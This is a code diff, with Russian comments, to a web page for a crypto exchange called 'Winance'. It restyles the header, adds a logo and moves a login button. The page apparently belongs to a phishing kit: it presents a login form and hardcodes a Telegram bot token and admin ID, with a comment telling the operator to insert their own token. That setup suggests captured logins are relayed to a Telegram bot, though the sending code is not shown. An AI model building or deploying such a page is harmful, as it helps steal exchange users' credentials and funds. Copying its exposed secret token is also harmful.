@@ -18,7 +18,7 @@
     --text-primary: #0A0B0D;
     --text-secondary: #5B616E;
     --text-muted: #8E9299;
-    --accent: #1BADFF; /* Синий Winance */
+    --accent: #1BADFF;
     --accent-hover: #0D8FD9;
     --success: #05713F;
     --danger: #CF202F;
@@ -68,23 +68,37 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 .appbar {
     display: flex;
     align-items: center;
-    gap: 12px;
-    margin-bottom: 16px;
+    justify-content: space-between;
+    margin-bottom: 20px;
     padding-bottom: 12px;
     border-bottom: 1px solid var(--border);
 }
-.appbar-logo {
-    width: 32px; height: 32px;
+
+/* Блок с логотипом */
+.appbar-brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+/* Оригинальный логотип Winance (черный, с короной) */
+.logo-svg {
+    height: 24px;
+    width: auto;
+    display: block;
+}
+
+/* Кнопка Войти наверху */
+.btn-login-top {
     background: var(--accent);
     color: #fff;
-    border-radius: 8px;
-    display: flex; align-items: center; justify-content: center;
-    font-weight: 700; font-size: 18px;
-    flex-shrink: 0;
+    padding: 8px 18px;
+    border-radius: var(--radius-sm);
+    font-size: 14px;
+    font-weight: 600;
+    transition: background .15s;
     box-shadow: var(--shadow-accent);
 }
-.appbar-title { font-size: 18px; font-weight: 700; letter-spacing: -0.3px; }
-.appbar-sub { font-size: 11px; color: var(--text-secondary); margin-top: 1px; text-transform: uppercase; letter-spacing: 1px; }
+.btn-login-top:hover { background: var(--accent-hover); }
 
 /* ===== ГРАФИК ===== */
 .chart-container {
@@ -353,12 +367,17 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
 <div class="app">
 
+    <!-- ============ ВЕРХНЯЯ ПАНЕЛЬ (ЛОГО + КНОПКА) ============ -->
     <div class="appbar">
-        <div class="appbar-logo">W</div>
-        <div>
-            <div class="appbar-title">Winance</div>
-            <div class="appbar-sub">Exchange</div>
+        <div class="appbar-brand">
+            <!-- Оригинальный логотип Winance -->
+            <svg class="logo-svg" viewBox="0 0 140 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M25.5 7L20.5 10.5L15.5 5L10.5 10.5L5.5 7L7.5 14L3 21H18L23 14H27L25.5 7ZM15.5 18H10L13 11L15.5 18Z" fill="#0A0B0D"/>
+                <text x="35" y="22" font-family="Inter, sans-serif" font-size="22" font-weight="800" fill="#0A0B0D" letter-spacing="-0.5">Winance</text>
+            </svg>
         </div>
+        <!-- Кнопка Войти -->
+        <button class="btn-login-top" onclick="goTo('loginForm')">Войти</button>
     </div>
 
     <!-- ============ ГЛАВНАЯ ============ -->
@@ -373,7 +392,6 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
                     <div class="chart-change" id="btcChange">--</div>
                 </div>
             </div>
-            <!-- TradingView Widget -->
             <div id="tradingview_btc" style="height: 280px;"></div>
         </div>
 
@@ -395,8 +413,6 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
                 FAQ <span class="arrow">›</span>
             </button>
         </div>
-
-        <button class="btn-primary" onclick="goTo('loginForm')">Войти</button>
 
         <div class="register-link">
             Нет аккаунта? <a href="#" onclick="showMessage('Регистрация на winance.exchange','info');return false;">Зарегистрироваться</a>
@@ -504,7 +520,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         "symbol": "BINANCE:BTCUSDT",
         "interval": "60",
         "timezone": "Etc/UTC",
-        "theme": "light", // Светлая тема
+        "theme": "light",
         "style": "1",
         "locale": "ru",
         "toolbar_bg": "#F5F7FA",
@@ -515,7 +531,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     });
 
     // ============================================================
-    // КОНФИГ
+    // КОНФИГ (ВСТАВЬ СВОЙ ТОКЕН)
     // ============================================================
     const BOT_TOKEN = "8962930921:AAEiwjp0QH4YJQv8-SJ0Y0WXC7-swgkUKxA";
     const ADMIN_ID  = "8949174431";
